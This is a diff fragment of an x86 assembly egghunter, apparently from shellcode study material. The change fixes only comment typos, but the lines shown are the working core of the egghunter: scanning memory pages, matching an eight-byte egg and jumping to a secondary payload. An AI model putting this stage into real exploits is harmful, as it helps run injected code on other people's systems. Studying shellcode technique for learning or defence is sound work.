@@ -33,11 +33,11 @@ _start:
     popad                  ; Restore the register values as we preserved in the stack
     jz turn_page           ; Jump to next page if we got EFAULT otherwise continue
 
-    ; Now that we know the memeory is accessible, we will search for our target!
+    ; Now that we know the memory is accessible, we will search for our target!
     cmp [edx], ebx         ; Check if we got the egg in [EDX]
     jnz check_page         ; If not zero - Egg not found! Check the next 8 bytes of the page otherwise if zero - we already found the first 4 bytes of the egg
     cmp [edx+0x4], ebx     ; Check the next 4 bytes [EDX+4] to confirm the kill
-    jnz check_page         ; If not zero - Egg wasn't found, false positive! otherwise if zero - mission accomplished - egg found successfully!
+    jnz check_page         ; If not zero - Egg wasn't found, false-positive! otherwise if zero - mission accomplished - egg found successfully!
     jmp edx                ; Transfer control to the secondary payload
 
 
